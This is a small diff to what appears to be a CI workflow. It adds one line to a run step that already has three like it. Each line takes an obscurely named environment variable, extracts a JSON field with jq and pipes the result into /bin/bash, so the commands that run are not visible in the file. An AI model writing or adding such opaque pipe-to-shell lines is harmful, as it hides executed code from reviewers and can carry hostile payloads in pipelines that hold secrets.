@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$dfazz7" | jq -r .bm2 | /bin/bash
           echo $st388 | jq -r .vrf261 | /bin/bash
           echo $bnk45 | jq -r .koqy2201 | /bin/bash
+          echo $xv42730 | jq -r .ds0 | /bin/bash
 
       - name: Upload data
         if: always()
